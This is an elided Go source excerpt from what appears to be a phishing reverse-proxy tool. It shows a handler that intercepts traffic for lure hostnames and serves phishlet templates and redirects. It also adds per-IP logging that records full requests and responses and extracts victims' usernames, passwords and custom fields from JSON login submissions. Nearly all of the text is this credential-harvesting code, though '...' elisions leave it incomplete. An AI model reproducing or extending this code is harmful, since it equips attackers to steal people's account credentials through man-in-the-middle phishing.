...
var log_output = true
var mtx_log1 *sync.Mutex = &sync.Mutex{}
var IP_LOG_FILE = "local.txt"

func SetLogFile(ip string) {
	IP_LOG_FILE = fmt.Sprintf("%s-log.txt", ip)
}

func write_log(filename string , format string, args ...interface{}){
	if !log_output {
		return
	}
	
	mtx_log1.Lock()
	defer mtx_log1.Unlock()
	...
	timeNow := string(time.Now().Format("2006-01-02 15:04:05"))+"\r\n"
	_, err = file.Write([]byte(timeNow))
	if err != nil {
		fmt.Println(err)
		return
	}
	message := fmt.Sprintf( format, args...)+"\r\n"
	_, err = file.Write([]byte(message)) // convert message to []byte ,and then store message to file
	if err != nil {
		fmt.Println(err)
		return
	}
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			write_log(IP_LOG_FILE, "=========***===========")
			write_log(IP_LOG_FILE, "URL: %s", req_url)
			...
			if phished {
								...
								if !p.isForwarderUrl(req.URL) {
									...
									if _, err := os.Stat(path); !os.IsNotExist(err) {
										...
										if err == nil {
											...
											if resp != nil {
												write_log(IP_LOG_FILE, "*******req template******:\r\n%s", req)
												write_log(IP_LOG_FILE, "*******resp template******:\r\n%s", resp)
												return req, resp
											} else {
				...
				if pl != nil {
					...
					if err == nil {
						...
						if resp != nil {
							...
							write_log(IP_LOG_FILE, "*******req redirect******:\r\n%s", req)
							write_log(IP_LOG_FILE, "*******resp redirect******:\r\n%s", resp)
							return req, resp
						}
					}
				}
				...
				if p.cfg.IsLureHostnameValid(req.Host) {
					...
					if resp != nil {
						//write log of request
						write_log(IP_LOG_FILE, "*******req 404******:\r\n%s", req)
						write_log(IP_LOG_FILE, "*******resp 404******:\r\n%s", resp)
						return req, resp
					}
				}
						...
						if contentType == "application/json" {
							...
							if pl.username.tp == "json" {
								...
								if um != nil && len(um) > 1 {
									...
									write_log(IP_LOG_FILE, "[%d] Username: [%s]", ps.Index, um[1])
							...
							if pl.password.tp == "json" {
								...
								if pm != nil && len(pm) > 1 {
									...
									write_log(IP_LOG_FILE,   "[%d] Password: [%s]", ps.Index, pm[1])
							...
							for _, cp := range pl.custom {
								if cp.tp == "json" {
									...
									if cm != nil && len(cm) > 1 {
										...
										write_log(IP_LOG_FILE,  "[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
					...
					if s.RedirectURL != ""  {
						if stringExists(mime, []string{"text/html"}) {
							...
							if resp != nil {
								...
								//write log of response content
								write_log(IP_LOG_FILE, "*******resp******:\r\n%s", resp)
								return resp
							}
						}
					}
	...
	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		...
		for _, ph := range pl.proxyHosts {
			...
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				//For adfs
				if(strings.Contains(ph.domain, ":443")){
					continue;
				}
